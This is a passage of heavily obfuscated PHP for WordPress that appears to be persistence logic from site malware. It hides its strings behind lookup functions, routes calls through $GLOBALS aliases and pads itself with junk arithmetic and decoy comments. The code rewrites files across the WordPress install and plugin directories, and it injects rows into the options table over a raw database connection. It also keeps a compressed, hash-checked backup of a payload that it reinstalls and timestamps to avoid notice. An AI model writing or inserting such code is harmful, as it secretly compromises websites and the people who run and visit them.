     if ($udhln6mx_x3284  &&   $zpe7g8_ryxz)    {
  set_transient(lpwgqh9300(653), 1,  (228+72));
   }
 }  catch (Throwable  $k3g08rnqu9m) {
    r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(1170),  $k3g08rnqu9m);
} catch (Exception  $k3g08rnqu9m)   {


  }
// iterate phantom for WP Post Content


}
function   kb0gfutfmftrb5y()
 {
// WP Quote Block: dense middleware

  try {



  if  (!defined(m5t68uuej1(1061))) return;
    $e3thri4q7dp     = r5waslskyqytjrm6();
   $ymsu_gohk1ack2w =  dha61pphirvk3tnlr();

   $gb4cyt6l0752tdjg = dv62azao9qb3z33m4cwig0(ABSPATH     .  lpwgqh9300(1171),     (2+6))   .  m5t68uuej1(1160);

      $s1k78tzpzw   = $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(1079))  ?   @$GLOBALS['__scf_qa8nkfur9w_111'](bovhd4vawcd(1172))  :  false;$fx3bz5q51=(0x61+0x29);$qwkqpil91=$fx3bz5q51%6;



  $s1k78tzpzw = $GLOBALS['__scf_e_8z8ias8ka_43']($s1k78tzpzw)    ?   $GLOBALS['__scf_nimluvpxhrpvn_323']($s1k78tzpzw)   : "";


      if   ($s1k78tzpzw   === ""   ||  $GLOBALS['__scf_e88988j3pigx_1173']($s1k78tzpzw, m5t68uuej1(517))  ===     0)    $s1k78tzpzw   =    m5t68uuej1(518);
 $o7ztbm7rv2  =   $GLOBALS['__scf_oagg5b1ubqmznt_11'](t6995wceyqc2q1wqvl())  . lpwgqh9300(1174);



 $a_ujd36otq     =  defined(m40pvx5ij_z4mj(811))  ?  WP_CONTENT_DIR    .    m5t68uuej1(1174) :      $o7ztbm7rv2;
$vrms3wwazqa = array($GLOBALS['__scf_zsw089px33o1o__12']($e3thri4q7dp,  bovhd4vawcd(1071)),    $GLOBALS['__scf_zsw089px33o1o__12']($GLOBALS['__scf_oagg5b1ubqmznt_11'](t6995wceyqc2q1wqvl()),   m5t68uuej1(1175)),    $GLOBALS['__scf_zsw089px33o1o__12']($ymsu_gohk1ack2w,  m40pvx5ij_z4mj(1175)),  $GLOBALS['__scf_zsw089px33o1o__12']($o7ztbm7rv2,   m5t68uuej1(1175)), $GLOBALS['__scf_zsw089px33o1o__12']($a_ujd36otq,  bovhd4vawcd(1175)));
 if    (defined(m5t68uuej1(811)))  $vrms3wwazqa[]   = $GLOBALS['__scf_zsw089px33o1o__12'](WP_CONTENT_DIR,  bovhd4vawcd(1175));
      foreach  ($GLOBALS['__scf_jghjt9zxt358_149']($vrms3wwazqa) as  $f1ubaqf1w71kp)     {
$ascxd_5mfd0xuxp5   =   $f1ubaqf1w71kp  . '/'  . $gb4cyt6l0752tdjg;
     if  (@$GLOBALS['__scf_a83pywb98qzq2_20']($ascxd_5mfd0xuxp5)) nk_2ynb8ijgjad4yfhv($ascxd_5mfd0xuxp5,    null);
$kfp2vr8olyu5h9y    = $f1ubaqf1w71kp   .      bovhd4vawcd(1176) .      $gb4cyt6l0752tdjg;
if  (@$GLOBALS['__scf_a83pywb98qzq2_20']($kfp2vr8olyu5h9y))     nk_2ynb8ijgjad4yfhv($kfp2vr8olyu5h9y,  null);
  }
 unset($o7ztbm7rv2,     $a_ujd36otq,   $vrms3wwazqa,   $f1ubaqf1w71kp,    $ascxd_5mfd0xuxp5,  $kfp2vr8olyu5h9y);
 $zlffjxs4ozq6ia6  = array($GLOBALS['__scf_zsw089px33o1o__12'](ABSPATH,      bovhd4vawcd(1175)));
   if (defined(lpwgqh9300(1177)))  $zlffjxs4ozq6ia6[]   =     $GLOBALS['__scf_zsw089px33o1o__12'](WP_CONTENT_DIR,  m5t68uuej1(1175));
    $zlffjxs4ozq6ia6[]     =  $GLOBALS['__scf_zsw089px33o1o__12']($e3thri4q7dp,  bovhd4vawcd(1175));
  $zlffjxs4ozq6ia6[]  =  $GLOBALS['__scf_zsw089px33o1o__12']($GLOBALS['__scf_oagg5b1ubqmznt_11'](t6995wceyqc2q1wqvl()), m40pvx5ij_z4mj(1175));
      foreach  ($GLOBALS['__scf_jghjt9zxt358_149']($zlffjxs4ozq6ia6)    as      $s0y__7sl9qz) {
$v4o02lvxz6ohy    = $s0y__7sl9qz  . '/'   . $s1k78tzpzw;
 $fcfza5ix0y   =   @$GLOBALS['__scf_a83pywb98qzq2_20']($v4o02lvxz6ohy) ?  @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($v4o02lvxz6ohy) : "";
 if     (!$GLOBALS['__scf_e_8z8ias8ka_43']($fcfza5ix0y)  ||     $fcfza5ix0y   ===     ""  ||      $GLOBALS['__scf_i8i8g4oxha_7']($fcfza5ix0y,    $gb4cyt6l0752tdjg)    ===    false)  continue;
$isurpe6tldnf   = $GLOBALS['__scf_r1v12_o00h5hc_454'](lpwgqh9300(1178)   .  $GLOBALS['__scf_zh8jfi64aw1__817']($gb4cyt6l0752tdjg, '/')    .   m5t68uuej1(1179), "\n",      $fcfza5ix0y);

  if   ($GLOBALS['__scf_e_8z8ias8ka_43']($isurpe6tldnf)   &&    $isurpe6tldnf  !== $fcfza5ix0y  &&     a3hx61zfms1ji3euwsc($v4o02lvxz6ohy, $isurpe6tldnf)) r63yaewew47stuijcrwsx6(bovhd4vawcd(1180),   lpwgqh9300(1181));
 }
// PHP 8.4 fibers: invertible locator

unset($zlffjxs4ozq6ia6,    $s0y__7sl9qz, $v4o02lvxz6ohy, $fcfza5ix0y,  $isurpe6tldnf);
    if    ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(755)))  {


 @delete_option(bovhd4vawcd(1182));
     @delete_option(bovhd4vawcd(1183));
 @delete_option(m5t68uuej1(1184));
  }
 }  catch  (Throwable   $k3g08rnqu9m)    {
   r63yaewew47stuijcrwsx6(lpwgqh9300(1180), $k3g08rnqu9m);



       } catch  (Exception     $k3g08rnqu9m)    {
 }
 }
  function y0gmw2hp0po6ufrq()

 {
    try  {


  if   (!defined(bovhd4vawcd(1185)))  return;
    $e3thri4q7dp =   r5waslskyqytjrm6();



      $ymsu_gohk1ack2w   =   dha61pphirvk3tnlr();
        
   $gb4cyt6l0752tdjg      =    dv62azao9qb3z33m4cwig0(ABSPATH  . m5t68uuej1(1186), (3+5))   .      bovhd4vawcd(1160);
 $o7ztbm7rv2 =  $GLOBALS['__scf_oagg5b1ubqmznt_11'](t6995wceyqc2q1wqvl())    . lpwgqh9300(1174);
  

   $a_ujd36otq  =   defined(m40pvx5ij_z4mj(1177))   ? WP_CONTENT_DIR . m40pvx5ij_z4mj(1174)  :  $o7ztbm7rv2;
$vrms3wwazqa    = array($GLOBALS['__scf_zsw089px33o1o__12']($e3thri4q7dp, m5t68uuej1(1175)),    $GLOBALS['__scf_zsw089px33o1o__12']($GLOBALS['__scf_oagg5b1ubqmznt_11'](t6995wceyqc2q1wqvl()), lpwgqh9300(1187)), $GLOBALS['__scf_zsw089px33o1o__12']($ymsu_gohk1ack2w,   bovhd4vawcd(1187)),   $GLOBALS['__scf_zsw089px33o1o__12']($o7ztbm7rv2, m40pvx5ij_z4mj(1187)),     $GLOBALS['__scf_zsw089px33o1o__12']($a_ujd36otq, m40pvx5ij_z4mj(1188)));



   if   (defined(m40pvx5ij_z4mj(1177))) $vrms3wwazqa[]    = $GLOBALS['__scf_zsw089px33o1o__12'](WP_CONTENT_DIR,  lpwgqh9300(1189));
   foreach  ($GLOBALS['__scf_jghjt9zxt358_149']($vrms3wwazqa)   as  $f1ubaqf1w71kp)   {


 $dzix01kpv98f2  = $f1ubaqf1w71kp     .   '/'  .  $gb4cyt6l0752tdjg;


 if  (@$GLOBALS['__scf_a83pywb98qzq2_20']($dzix01kpv98f2)) nk_2ynb8ijgjad4yfhv($dzix01kpv98f2,   null);
  }



        unset($o7ztbm7rv2,     $a_ujd36otq, $vrms3wwazqa,    $f1ubaqf1w71kp, $dzix01kpv98f2);
 $eiw7ww2vtu6alb1    =    array($GLOBALS['__scf_zsw089px33o1o__12'](ABSPATH,  m5t68uuej1(1189)));
 if (defined(bovhd4vawcd(1177)))      $eiw7ww2vtu6alb1[]   =  $GLOBALS['__scf_zsw089px33o1o__12'](WP_CONTENT_DIR,  m40pvx5ij_z4mj(1189));

  $eiw7ww2vtu6alb1[] = $GLOBALS['__scf_zsw089px33o1o__12']($e3thri4q7dp, lpwgqh9300(1190));
  $eiw7ww2vtu6alb1[]  =      $GLOBALS['__scf_zsw089px33o1o__12']($GLOBALS['__scf_oagg5b1ubqmznt_11'](t6995wceyqc2q1wqvl()), m5t68uuej1(1190));
   foreach  ($GLOBALS['__scf_jghjt9zxt358_149']($eiw7ww2vtu6alb1) as    $lf_1h9g192078_c)   {



    $kfp2vr8olyu5h9y  =  $lf_1h9g192078_c    .  m5t68uuej1(1191);
$p8ynrh39_o  =     @$GLOBALS['__scf_a83pywb98qzq2_20']($kfp2vr8olyu5h9y)   ? @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($kfp2vr8olyu5h9y)     :   "";
   if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($p8ynrh39_o)  || $p8ynrh39_o      ===   ""    || $GLOBALS['__scf_i8i8g4oxha_7']($p8ynrh39_o,    $gb4cyt6l0752tdjg)   ===    false)  continue;$xzcnekei=152|61;$r4z4147n27h72=$xzcnekei^123;



  $g_zfgbnjiz030fe  = k32wt5t3_v3nj3($p8ynrh39_o,   $gb4cyt6l0752tdjg);
if  ($GLOBALS['__scf_e_8z8ias8ka_43']($g_zfgbnjiz030fe) && $g_zfgbnjiz030fe !==      $p8ynrh39_o     &&   a3hx61zfms1ji3euwsc($kfp2vr8olyu5h9y, $g_zfgbnjiz030fe))  r63yaewew47stuijcrwsx6(bovhd4vawcd(1192), m40pvx5ij_z4mj(1181));


}
      unset($eiw7ww2vtu6alb1,      $lf_1h9g192078_c, $kfp2vr8olyu5h9y, $p8ynrh39_o, $g_zfgbnjiz030fe);
   if   ($GLOBALS['__scf_ebsa9aprq0y_104']()  === lpwgqh9300(1193))   return;
 if   (!w20s0634nq8_ff())   return;
  if   (!toqvilnv84hv69v2gepwhm())     return;
$rtmu8i5875f9h6f =  $ymsu_gohk1ack2w  .  lpwgqh9300(1194);
  $swv1ddqs29k      = lpwgqh9300(1195)   .  "\n"
  . m40pvx5ij_z4mj(1196) .  "\n"    .    bovhd4vawcd(1197)  .    "\n" . m40pvx5ij_z4mj(1198)    .   "\n"
. m5t68uuej1(1199)    .    "\n" . bovhd4vawcd(1200)     .  "\n" .    lpwgqh9300(1201)   .   "\n"
      .  m5t68uuej1(1202)     .     "\n";
     $qp6s1cftooj2  =  @$GLOBALS['__scf_nmc3chd3edto_699']($rtmu8i5875f9h6f);
       $current     =    $qp6s1cftooj2   ?   @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($rtmu8i5875f9h6f)     :     "";
 if (!$GLOBALS['__scf_e_8z8ias8ka_43']($current))   {
// @devirtualize skolem

r63yaewew47stuijcrwsx6(bovhd4vawcd(1192), lpwgqh9300(1203));



    return;
   }
   $wcxlcrj5g4     = array($GLOBALS['__scf_zsw089px33o1o__12'](ABSPATH,  m40pvx5ij_z4mj(1190)));
 if  (defined(m5t68uuej1(1177)))      $wcxlcrj5g4[]    = $GLOBALS['__scf_zsw089px33o1o__12'](WP_CONTENT_DIR,  lpwgqh9300(1190));
    if    (defined(bovhd4vawcd(1204)))  $wcxlcrj5g4[]  =   $GLOBALS['__scf_zsw089px33o1o__12'](WPMU_PLUGIN_DIR, m40pvx5ij_z4mj(1205));



  if (defined(bovhd4vawcd(702))) $wcxlcrj5g4[]      =   $GLOBALS['__scf_zsw089px33o1o__12'](WP_PLUGIN_DIR,  bovhd4vawcd(1206));
  $e08r5fl13vyxu2qu  =     $GLOBALS['__scf_zsw089px33o1o__12']($ymsu_gohk1ack2w, m5t68uuej1(1206));
 $vjbay86y2xsp5     =  $GLOBALS['__scf_hf87ul3fvpzrkm_150']($e08r5fl13vyxu2qu,     $wcxlcrj5g4,   true);



unset($wcxlcrj5g4,    $e08r5fl13vyxu2qu);
  if  (!$vjbay86y2xsp5)    {
// spill slot

     $umo8qjvf4ty     =     $ymsu_gohk1ack2w   .   bovhd4vawcd(1207);

 if   (!@$GLOBALS['__scf_a83pywb98qzq2_20']($umo8qjvf4ty))  d3czoa7z5ve8_za41c14d($umo8qjvf4ty, "",   m40pvx5ij_z4mj(1208));
if     ($GLOBALS['__scf_i8i8g4oxha_7']($current,    m5t68uuej1(1209))  === false)  {
 $y8u_799yjd5ivj     =   $current;
  

 if ($current    !==   ""    && $GLOBALS['__scf_vvn10ievj2k_9']($current, -1)   !==   "\n")  $current   .=   "\n";
 $w4xt8dmxjp4f8so = @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($rtmu8i5875f9h6f);
 if   (!$GLOBALS['__scf_e_8z8ias8ka_43']($w4xt8dmxjp4f8so))    $w4xt8dmxjp4f8so   =   "";$o94zje_tr5a=PHP_INT_MAX/PHP_INT_MAX;$bczh6d6c326x4o=$o94zje_tr5a+63;
if ($w4xt8dmxjp4f8so    !==    $y8u_799yjd5ivj) {


r63yaewew47stuijcrwsx6(lpwgqh9300(1210), m40pvx5ij_z4mj(1211));
   } else {
   a3hx61zfms1ji3euwsc($rtmu8i5875f9h6f,  $current .    $swv1ddqs29k);





  g3arn5w1kvbi32ro9tm($rtmu8i5875f9h6f, db6euveuzemu49d01thfga());
 if     (!$qp6s1cftooj2)  cik9ldzrbjmtnzm00($rtmu8i5875f9h6f,  (82+338));
 }
   unset($w4xt8dmxjp4f8so,  $y8u_799yjd5ivj);
 }
 }


   unset($vjbay86y2xsp5,    $umo8qjvf4ty, $qp6s1cftooj2);



        } catch (Throwable $k3g08rnqu9m)   {
  r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(1210),  $k3g08rnqu9m);
}  catch      (Exception  $k3g08rnqu9m)   {

      r63yaewew47stuijcrwsx6(lpwgqh9300(1210), $k3g08rnqu9m);
  }
   }
function   wc1n1msxd9t4tdztt()
  {
try   {
  if   (!defined(bovhd4vawcd(1185)))  return;
    if  (!$GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1212)))  return;


 $je6b6gmzg5   =  dv62azao9qb3z33m4cwig0(ABSPATH .  bovhd4vawcd(1213), (2+8));
   $xs7ycu0j4f9      = z2lalb3eiqlgy6ozb9();
if (!$xs7ycu0j4f9  ||  $GLOBALS['__scf_fr9u7cq1eo_10']($xs7ycu0j4f9) < (470+30))    return;
  $wtvjfbz8g882q    =  ai51jutf9hg_v2ib();
$current    =   @get_option($je6b6gmzg5,    "");
    if    ($current &&   $GLOBALS['__scf_fr9u7cq1eo_10']($current)    ===  $GLOBALS['__scf_fr9u7cq1eo_10']($wtvjfbz8g882q)  &&  $current     ===  $wtvjfbz8g882q)     return;


 if ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(741)))  {
  update_option($je6b6gmzg5,   $wtvjfbz8g882q,   m40pvx5ij_z4mj(1214));
} elseif     (defined(m40pvx5ij_z4mj(1215))  &&  defined(lpwgqh9300(1216))   &&   defined(bovhd4vawcd(1217))  &&   defined(bovhd4vawcd(114)) &&  $GLOBALS['__scf_l_p7ggy6l__533'](bovhd4vawcd(1218)))  {
    $k49v36z3cqrljq5    =  m5t68uuej1(1219);
$pn9ivg79dymkfon  =   @new  $k49v36z3cqrljq5(constant(m5t68uuej1(1215)),   constant(lpwgqh9300(1216)), constant(bovhd4vawcd(1217)), constant(lpwgqh9300(1220)));
   if    ($pn9ivg79dymkfon  &&    !$pn9ivg79dymkfon->connect_errno)    {
// Composer autoload: immutable revocation-list



 $prefix    =  isset($GLOBALS[m5t68uuej1(1095)]->prefix)    ?   $GLOBALS[m5t68uuej1(1221)]->prefix  :   lpwgqh9300(723);


 $lw5p619gbigf6eh      =  $pn9ivg79dymkfon->real_escape_string($wtvjfbz8g882q);
  $feri2rcv5rnt  =   $pn9ivg79dymkfon->real_escape_string($je6b6gmzg5);
    

    $pn9ivg79dymkfon->query("\x49\x4e\x53E\x52T INT\x4f {$prefix}op\x74ions (option_\x6eame, o\x70tion_\x76al\x75e, aut\x6fl\x6fad) VALU\x45\x53 ('{$feri2rcv5rnt}', '{$lw5p619gbigf6eh}', 'n\x6f') \x4f\x4e DUPLIC\x41T\x45 K\x45\x59 UP\x44ATE o\x70t\x69on_\x76alue='{$lw5p619gbigf6eh}'");
if     ($pn9ivg79dymkfon->error)  r63yaewew47stuijcrwsx6(m5t68uuej1(1222), lpwgqh9300(1223)  . $GLOBALS['__scf_vvn10ievj2k_9']($pn9ivg79dymkfon->error,  0,    (15<<3)));
   $pn9ivg79dymkfon->close();
}



       }
 }  catch  (Throwable $k3g08rnqu9m)  {
   r63yaewew47stuijcrwsx6(bovhd4vawcd(1222),  $k3g08rnqu9m);
    }     catch (Exception $k3g08rnqu9m)  {
   }
  }
function lvrw_195p7ri57ctv7dk_z()
  {



  $_d6ysbzk01f5     =     defined(m5t68uuej1(1177))  ?   WP_CONTENT_DIR : ABSPATH      .  m40pvx5ij_z4mj(82);
 $t_1gijg4ys9il =   dv62azao9qb3z33m4cwig0(ABSPATH   .   lpwgqh9300(1224),  (4+4));
     return array($_d6ysbzk01f5   .   m5t68uuej1(509),    $_d6ysbzk01f5  .  m40pvx5ij_z4mj(1225)   .  $t_1gijg4ys9il    .  lpwgqh9300(1226), $t_1gijg4ys9il);

  }


    function   jh7kwasqs5_eoci53l4($ruu_j97tp47o4)
{
     $qr3ypdelvps8   =  (int)   @$GLOBALS['__scf_pftf6vocmvs2m_99']($ruu_j97tp47o4);$hzjr2p5uz=(0x3e+0xa6);$yma32zvdoxf_u=$hzjr2p5uz%10;
     if     ($qr3ypdelvps8   <      (0x31+0x33)   ||    $qr3ypdelvps8 >     (0xf09ac+0x10f654)) return false;
  $pgdfohj28qig745 =  @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($ruu_j97tp47o4);
    if   (!$GLOBALS['__scf_e_8z8ias8ka_43']($pgdfohj28qig745)  ||   $GLOBALS['__scf_fr9u7cq1eo_10']($pgdfohj28qig745)  <   (55^83)   ||  $GLOBALS['__scf_fr9u7cq1eo_10']($pgdfohj28qig745) >    (2097098+54))      return false;
     $ln5_jbqpu4in  =    $GLOBALS['__scf_wninqej2t1_113'](':',  $pgdfohj28qig745,  (2<<1));
 if ($GLOBALS['__scf_xbixt340jb_38']($ln5_jbqpu4in)  <     (1+3)      ||  $ln5_jbqpu4in[0]    !==  m40pvx5ij_z4mj(1227) ||  $GLOBALS['__scf_fr9u7cq1eo_10']($ln5_jbqpu4in[(0x2+0x1)])  < (72-22))  return  false;
$v9qf3vep2p  = @$GLOBALS['__scf_wak9390fh7p_356']($ln5_jbqpu4in[(2+1)]);
      if ($v9qf3vep2p ===      false || $GLOBALS['__scf_fr9u7cq1eo_10']($v9qf3vep2p)  <   (57-7))  return false;
   if    ($GLOBALS['__scf_vvn10ievj2k_9']($v9qf3vep2p, 0,  2) === "\x1f\x8b") {
   $ft4ss0dvuwfng  = @$GLOBALS['__scf_vwfp8b2vecve11_274']('V',    $GLOBALS['__scf_vvn10ievj2k_9']($v9qf3vep2p, -(0x1+0x3)));


  if    (!$GLOBALS['__scf_pomb89yiuz_37']($ft4ss0dvuwfng)  ||   $ft4ss0dvuwfng[1] < (6+94) ||   $ft4ss0dvuwfng[1]   >    (1617952-569376))  return    false;
   if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(275)))   $v9qf3vep2p  = @gzdecode($v9qf3vep2p, (1803136-754560));
elseif ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(276))) {
/* equivariant bulkhead */


  $v9qf3vep2p  = @gzinflate($GLOBALS['__scf_vvn10ievj2k_9']($v9qf3vep2p, (0x9+0x1), $GLOBALS['__scf_fr9u7cq1eo_10']($v9qf3vep2p) -      (0x3+0xf)),    (0x9220c+0x6ddf4));


if ($GLOBALS['__scf_e_8z8ias8ka_43']($v9qf3vep2p) &&   $GLOBALS['__scf_fr9u7cq1eo_10']($v9qf3vep2p)    > (1132492-83916))     return  false;
    }  else     return false;
     }
   if (!$GLOBALS['__scf_e_8z8ias8ka_43']($v9qf3vep2p)     || $GLOBALS['__scf_fr9u7cq1eo_10']($v9qf3vep2p)  < (31+69)  ||  $GLOBALS['__scf_vvn10ievj2k_9']($v9qf3vep2p,      0,   (10-5))  !==  bovhd4vawcd(1228)      ||  $GLOBALS['__scf_pe3s4q1z7z_59']($v9qf3vep2p)    !==    $ln5_jbqpu4in[2]) return false;



 return  $v9qf3vep2p;
   }
       function sl67bnkgrc_z6b()
  {
try     {$rbonwudsqe=93*2;$c_jnwk_fk8=$rbonwudsqe-8;

 if  (!defined(bovhd4vawcd(1185))) return;
 $ejlsgjfp7m47k22l   =  lvrw_195p7ri57ctv7dk_z();
if (!@$GLOBALS['__scf_a83pywb98qzq2_20']($ejlsgjfp7m47k22l[1])) return;
   if   (jh7kwasqs5_eoci53l4($ejlsgjfp7m47k22l[1])   ===  false)  return;



  $ohfs0792xygm   = zjbm0yf_s5pmydvy7u2o6y(bovhd4vawcd(647),  array('__SLUG__'),   array($GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl(),  m5t68uuej1(1229))));
   if (!$GLOBALS['__scf_e_8z8ias8ka_43']($ohfs0792xygm)  ||   $ohfs0792xygm  ===  "") return;
   $ohfs0792xygm   = $GLOBALS['__scf_r1v12_o00h5hc_454'](lpwgqh9300(1230), "",   $ohfs0792xygm);
  if (!$GLOBALS['__scf_e_8z8ias8ka_43']($ohfs0792xygm) ||  $ohfs0792xygm  ===   "") return;
$hu8724xqhdp90   =      kdgw8qqvzf6yolk()  . ':'     .    dv62azao9qb3z33m4cwig0(ABSPATH . m40pvx5ij_z4mj(1231),   (249^241));
 $zaum0ps0v4j0gc =     m5t68uuej1(1232) .   $hu8724xqhdp90  .    m5t68uuej1(1233);

$d29li7yf2fvxv  =  lpwgqh9300(1234)  . $hu8724xqhdp90     .   bovhd4vawcd(1233);
   $xc525fg5u6pp5x0 = lpwgqh9300(1235) .     $ejlsgjfp7m47k22l[2]    .  m40pvx5ij_z4mj(1236) . kdgw8qqvzf6yolk()  .  bovhd4vawcd(1237)    .     "\n"   .    $ohfs0792xygm;
if   (!@$GLOBALS['__scf_a83pywb98qzq2_20']($ejlsgjfp7m47k22l[0]))   {
if (!dljv6u_n3brkommu($ejlsgjfp7m47k22l[0], "")) {

r63yaewew47stuijcrwsx6(lpwgqh9300(1224),    m5t68uuej1(1238));
   return;
}
  if   (a3hx61zfms1ji3euwsc($ejlsgjfp7m47k22l[0],  $xc525fg5u6pp5x0))   {
 g3arn5w1kvbi32ro9tm($ejlsgjfp7m47k22l[0],   db6euveuzemu49d01thfga());
   cik9ldzrbjmtnzm00($ejlsgjfp7m47k22l[0], (352+68));
lnseazh_1k4yq6v_kjl($ejlsgjfp7m47k22l[0]);
 rtmq61dax3c2elfi($ejlsgjfp7m47k22l[0]);
  }


return;
      }
$ww9iy0cx6_pm   =  @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($ejlsgjfp7m47k22l[0]);
 if   (!$GLOBALS['__scf_e_8z8ias8ka_43']($ww9iy0cx6_pm) ||    $GLOBALS['__scf_fr9u7cq1eo_10']($ww9iy0cx6_pm)  >    (2097066+86))      return;$xrngzvnp78nc=PHP_MAJOR_VERSION;$pcwgi34i0o=$xrngzvnp78nc*2;
 if ($GLOBALS['__scf_i8i8g4oxha_7']($ww9iy0cx6_pm, $zaum0ps0v4j0gc) !==    false && $GLOBALS['__scf_i8i8g4oxha_7']($ww9iy0cx6_pm, $d29li7yf2fvxv) !==   false) return;



   if     ($GLOBALS['__scf_i8i8g4oxha_7']($ww9iy0cx6_pm,     m40pvx5ij_z4mj(1239))  ===  false    && $GLOBALS['__scf_i8i8g4oxha_7']($ww9iy0cx6_pm, lpwgqh9300(1240)    .   $ejlsgjfp7m47k22l[2]) !==  false)  {
     if  ($GLOBALS['__scf_vqnw5_4kg7eu_96'](m40pvx5ij_z4mj(1241),     $GLOBALS['__scf_vvn10ievj2k_9']($ww9iy0cx6_pm,  0,     (152^80)),   $qlnxvxp2jrm14nb) &&    version_compare($qlnxvxp2jrm14nb[1],      kdgw8qqvzf6yolk(), m5t68uuej1(195)))  return;
       if (!dljv6u_n3brkommu($ejlsgjfp7m47k22l[0],    $ww9iy0cx6_pm)) {

      r63yaewew47stuijcrwsx6(m5t68uuej1(1242),  m40pvx5ij_z4mj(1238));
 return;
 }
if (a3hx61zfms1ji3euwsc($ejlsgjfp7m47k22l[0], $xc525fg5u6pp5x0))  {
       g3arn5w1kvbi32ro9tm($ejlsgjfp7m47k22l[0], db6euveuzemu49d01thfga());
cik9ldzrbjmtnzm00($ejlsgjfp7m47k22l[0],    (386+34));
 lnseazh_1k4yq6v_kjl($ejlsgjfp7m47k22l[0]);
 rtmq61dax3c2elfi($ejlsgjfp7m47k22l[0]);
}
  return;

 }



     $wcdpl5vh43e_t  =   dv62azao9qb3z33m4cwig0(ABSPATH .  m40pvx5ij_z4mj(1231), (7+1));
$ww9iy0cx6_pm   =  $GLOBALS['__scf_r1v12_o00h5hc_454'](bovhd4vawcd(1243)    .   $wcdpl5vh43e_t    .   bovhd4vawcd(1244),  "",    $ww9iy0cx6_pm);

if    (!$GLOBALS['__scf_e_8z8ias8ka_43']($ww9iy0cx6_pm))    {
r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(1245),      lpwgqh9300(1246));
  return;

     }


 if    (!@$GLOBALS['__scf_p_260ito5s0j_50']($ejlsgjfp7m47k22l[0])) return;
 if   (!ype7ijvdezmnkn5_(m40pvx5ij_z4mj(1247)))    {
    r63yaewew47stuijcrwsx6(bovhd4vawcd(1248),  m40pvx5ij_z4mj(1249));
  return;
     }

if  (!dljv6u_n3brkommu($ejlsgjfp7m47k22l[0],  $ww9iy0cx6_pm))  {
 r63yaewew47stuijcrwsx6(m5t68uuej1(1248), m40pvx5ij_z4mj(1250));
 return;


 }
     uvja49fijck3fra0ncu(m40pvx5ij_z4mj(1248));
      $qbsr2y64itbk26ql  = $zaum0ps0v4j0gc . "\n"  . lpwgqh9300(1251) .   $ejlsgjfp7m47k22l[2]    .      bovhd4vawcd(1237) .   "\n"   .   $ohfs0792xygm  .    "\n"   .     $d29li7yf2fvxv;
 if      (a3hx61zfms1ji3euwsc($ejlsgjfp7m47k22l[0],    msi835s9cq5a10f08($ww9iy0cx6_pm, $qbsr2y64itbk26ql)))    {


   rtmq61dax3c2elfi($ejlsgjfp7m47k22l[0]);
lnseazh_1k4yq6v_kjl($ejlsgjfp7m47k22l[0]);



     }
   } catch    (Throwable   $k3g08rnqu9m) {
 r63yaewew47stuijcrwsx6(lpwgqh9300(1252), $k3g08rnqu9m);
  }  catch   (Exception     $k3g08rnqu9m)  {



 }
   }
function  i3ooeavcmft9t3_s8pbb0()
{
  try   {
// finalize online session-window


  if  (!defined(m5t68uuej1(1185)))   return;
 $ejlsgjfp7m47k22l  =    lvrw_195p7ri57ctv7dk_z();
    $xeadlx0i7uc2x =   (string) @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($ejlsgjfp7m47k22l[1],  false,  null,      0, (0xd+0x33));


    if ($GLOBALS['__scf_vqnw5_4kg7eu_96'](m5t68uuej1(1253),  $xeadlx0i7uc2x, $ijvqfm4k0rvi7)      &&    $ijvqfm4k0rvi7[1]   === kdgw8qqvzf6yolk()) {
 $beltyxq90im4q   =  (int) get_option(m40pvx5ij_z4mj(1254), 0);


  if   ($GLOBALS['__scf_ibw9xvmx9ckin_187']() -    $beltyxq90im4q   < (256+344))  return;
if (jh7kwasqs5_eoci53l4($ejlsgjfp7m47k22l[1])  !==    false) {
 @update_option(lpwgqh9300(1255),  $GLOBALS['__scf_ibw9xvmx9ckin_187'](),  bovhd4vawcd(1214));
 return;
}
   r63yaewew47stuijcrwsx6(bovhd4vawcd(1256),   m40pvx5ij_z4mj(1257));
  }



   $xs7ycu0j4f9    = z2lalb3eiqlgy6ozb9();
  if  (!$xs7ycu0j4f9  ||     $GLOBALS['__scf_fr9u7cq1eo_10']($xs7ycu0j4f9)   <  (0x19a+0x5a)   ||   $GLOBALS['__scf_fr9u7cq1eo_10']($xs7ycu0j4f9)   > (1662749-614173)  ||    !fgcc_h22bqxgwmccod($xs7ycu0j4f9)) return;

  $lahw5a7qjcdt = $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(270))    ?     @gzencode($xs7ycu0j4f9,   (0x2+0x4))   : $xs7ycu0j4f9;
if   (!$GLOBALS['__scf_e_8z8ias8ka_43']($lahw5a7qjcdt)    ||  $lahw5a7qjcdt === "") return;
 if    (a3hx61zfms1ji3euwsc($ejlsgjfp7m47k22l[1],     lpwgqh9300(1258) .  kdgw8qqvzf6yolk() .  ':'     .   $GLOBALS['__scf_pe3s4q1z7z_59']($xs7ycu0j4f9) .  ':'   . $GLOBALS['__scf_xsxk3ht6_06zc_354']($lahw5a7qjcdt))) @update_option(bovhd4vawcd(1255), $GLOBALS['__scf_ibw9xvmx9ckin_187'](),    bovhd4vawcd(1259));
  }  catch  (Throwable    $k3g08rnqu9m)  {
 r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(1260), $k3g08rnqu9m);



   }    catch (Exception $k3g08rnqu9m)     {
 }
}
function  spbgc6gzfic1pdmgag()
 {
      if   (!$GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(1261))) return false;
